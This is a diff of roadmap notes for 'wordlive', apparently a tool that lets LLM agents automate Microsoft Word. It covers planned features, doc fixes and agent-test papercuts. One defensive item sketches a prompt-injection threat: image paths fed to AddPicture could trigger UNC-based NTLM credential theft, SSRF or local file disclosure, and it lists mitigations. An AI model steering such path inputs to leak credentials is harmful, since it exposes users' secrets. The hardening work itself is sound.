+### I. Application / window / view control (politeness-sensitive — gate or read-only)
+
+- **`Application.Options`** — spelling/grammar-check toggles, display settings.
+  *Global app state; write only behind a loud opt-in.*
+- **View / window** — `ActiveWindow.View.Type`, zoom, split, `Windows.Arrange`,
+  `ActivePane`. Could help a vision-model workflow (set print-layout before a
+  snapshot) but mutates the user's UI. *Weight: low; mostly let `snapshot`
+  handle layout implicitly.*
+- **`DisplayAlerts` / `ScreenUpdating`** — performance/quiet-mode toggles for
+  long batches. *Internal optimization, not an agent verb.*
+- **Printing** — `Document.PrintOut`, print settings. *Real side-effect; gate
+  like persistence if ever added.*
+
+### J. Read-only discovery collections (round out "what's in this doc")
+
+wordlive already has `doc.lists` / `doc.tables` / (planned) `doc.images` /
+`doc.footnotes`. The same one-call-to-see-everything pattern is missing for:
+
+- **`doc.hyperlinks`** (already noted under Part-II hyperlinks),
+  **`doc.fields`** (every field + its code/type/locked state),
+  **`doc.bookmarks.list()`** (currently name-indexed only),
+  **`doc.revisions`** (already deferred under collaboration),
+  **`doc.properties`** (group B). *Weight: each is cheap and additive; bundle as
+  a "discovery surface" pass once a couple of the producing features land.*
 
 ---
 
-## Cross-cutting work (any release)
+# Cross-cutting work (any release)
 
-- **HRESULT coverage** — `_BUSY_HRESULTS` is a starter set; widen as we
-  hit real `pywintypes.com_error` HRESULTs in smoke runs.
-- **Smoke fixtures** — a real `.docx` checked into the repo with known
-  bookmarks / CCs / headings / tables, so smoke tests have a known target.
-- **Docs** — `spec.md` is the design doc; a separate `cookbook.md` of
-  end-to-end LLM-tool examples is probably more useful than API reference
-  docs at this stage. The 2026-05 agent-test build (blank doc → styled
-  multi-page catalogue) is a ready-made cookbook entry.
+- **Image-source hardening (read-side gate, pairs with Persistence).** Raised
+  2026-05-31. `insert_image --path …` hands `FileName` to `AddPicture`, which
+  resolves more than local paths — making the *path* input (not bytes/base64) an
+  attack surface a prompt injection can reach. Threats: **UNC → NTLM credential
+  theft** (sharpest — `image_on_disk`'s own `Path(p).is_file()` probe triggers
+  SMB auth *before* COM), **URL → SSRF** (incidentally closed today), **local
+  image-file disclosure**. Mitigation mirrors the save whitelist: Python API
+  ungated; **CLI/MCP reject non-local `FileName`s (UNC `\\…`, URL/`file://`)
+  before the `is_file()` probe**; optional `--image-dir`/`WORDLIVE_IMAGE_DIRS`
+  allowlist; steer MCP toward base64/bytes; reuse the `PathNotAllowedError`
+  denial type. `LinkToFile=False` ⇒ one-shot fetch at insert time (blast radius
+  = the single call, not a stored link).
+- **HRESULT coverage** — `_BUSY_HRESULTS` is a starter set; widen as real
+  `pywintypes.com_error` HRESULTs surface in smoke runs.
+- **Smoke fixtures** — a real `.docx` checked in with known bookmarks / CCs /
+  headings / tables, so smoke tests have a known target.
+- **Docs** — `spec.md` is the design doc; a `cookbook.md` of end-to-end LLM-tool
+  examples is probably more useful than API reference at this stage. The 2026-05
+  agent-test build (blank doc → styled multi-page catalogue) is a ready-made
+  cookbook entry.
 
-### Papercuts found in the 2026-05 agent test
+## Open papercuts (from the 2026-05 agent test)
 
-- **Relative image paths fail. → Promoted 2026-05-31: fix in the next patch.**
-  `insert_image --path foo.png` errors with COM `0x80020009` ("This is not a
-  valid file name") whenever the path is relative, because
-  `InlineShapes.AddPicture` resolves it against *Word's* working directory, not
-  the CLI's. Fix: `Path(p).resolve()` (or resolve against CWD) before handing the
-  path to COM. Pure papercut, no API change — and a likely silent foot-gun for
-  every agent that passes a relative path.
-- **`heading:N` is mis-described in the agent guide.** `SKILL.md` / `llm-help`
-  call it "the Nth heading (1-based)", but the id is actually the *paragraph
-  index* restricted to headings — so the first heading can be `heading:7`. The
-  library docstrings (`_anchors.py`, `_document.py`) already say this correctly;
-  the agent-facing copy lies. Reword to "the Nth *paragraph*, which must be a
-  heading — same index space as `para:N`". `outline` emits the right ids, so
-  copy-don't-compute already works; the fix is purely to stop agents expecting
-  `heading:1` for the first heading.
+- ~~**`heading:N` is mis-described in the agent guide.**~~ ✅ Fixed 2026-06-01.
+  Both `_skill/wordlive-python/SKILL.md` and `_skill/wordlive-cli/SKILL.md` now
+  describe it as "the Nth *paragraph*, which must be a heading — same index space
+  as `para:N`", matching the library docstrings (the first heading is rarely
+  `heading:1`; copy the id from `outline`).
 - **Inline JSON vs. Windows paths.** `exec --ops '{…}'` with backslash paths
-  mangles reliably under PowerShell quoting + JSON escaping. The guide already
-  documents `--ops -` (stdin) for large payloads; add a one-line note that
-  path-bearing batches should use `--script FILE` or `--ops -` to dodge
-  shell-escaping entirely.
+  mangles under PowerShell quoting + JSON escaping. Add a one-line guide note
+  that path-bearing batches should use `--script FILE` or `--ops -` to dodge
+  shell-escaping.
+- ~~**Relative image paths fail.**~~ ✅ Fixed in v0.10.2 (`Path(p).resolve()`
+  before COM).
